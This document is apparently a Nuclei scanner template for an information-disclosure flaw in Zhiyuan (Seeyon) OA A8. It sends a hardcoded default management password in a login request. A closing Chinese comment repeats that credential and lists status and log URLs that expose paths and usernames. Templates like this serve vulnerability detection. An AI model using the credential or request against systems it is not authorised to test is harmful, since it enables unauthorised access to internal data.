id: zhiyuanOA-statusjsp-info-leak
info:
  name: 致远OA A8 status.jsp 信息泄露漏洞
  author: cnaq
  severity: medium  
  description: 致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20status.jsp%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
  tags: zhiyuanOA,info,leak

requests:
  - raw:
      - |
        POST /seeyon/management/index.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        password=WLCCYBD%40SEEYON

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
          
      - type: word
        part: header
        words:
          - '/seeyon/management/status.jsp'


# 后台密码为 WLCCYBD@SEEYON 登录后通过如下url获得一些敏感信息
# /seeyon/management/status.jsp
# /seeyon/logs/login.log
# /seeyon/logs/v3x.log
